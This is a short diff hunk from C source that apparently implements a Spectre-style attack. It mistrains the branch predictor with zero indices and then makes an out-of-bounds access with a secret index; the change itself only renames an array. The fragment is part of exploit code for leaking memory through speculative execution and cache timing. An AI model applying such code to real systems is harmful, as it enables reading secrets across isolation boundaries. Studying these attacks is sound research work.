@@ -49,13 +49,13 @@ int* prepare(int secret_index) {
 
     //Access decisions in array, repeated out-of-bounds not traceable for branch predictor
     int n_accesses = N_TRAINING + 1;
-    int accesses[n_accesses];
-    for(int i = 0; i < n_accesses; i++) accesses[i] = 0;
-    accesses[n_accesses-1] = secret_index;
+    int parameters[n_accesses];
+    for(int i = 0; i < n_accesses; i++) parameters[i] = 0;
+    parameters[n_accesses-1] = secret_index;
 
     //Misstrain branch predictor, access out of bounds on last call
     for(int i = 0; i < n_accesses; i++) {
-        victim_func(accesses[i]);
+        victim_func(parameters[i]);
 
         cpuid();
         //flush hits from training phase (all but last access)
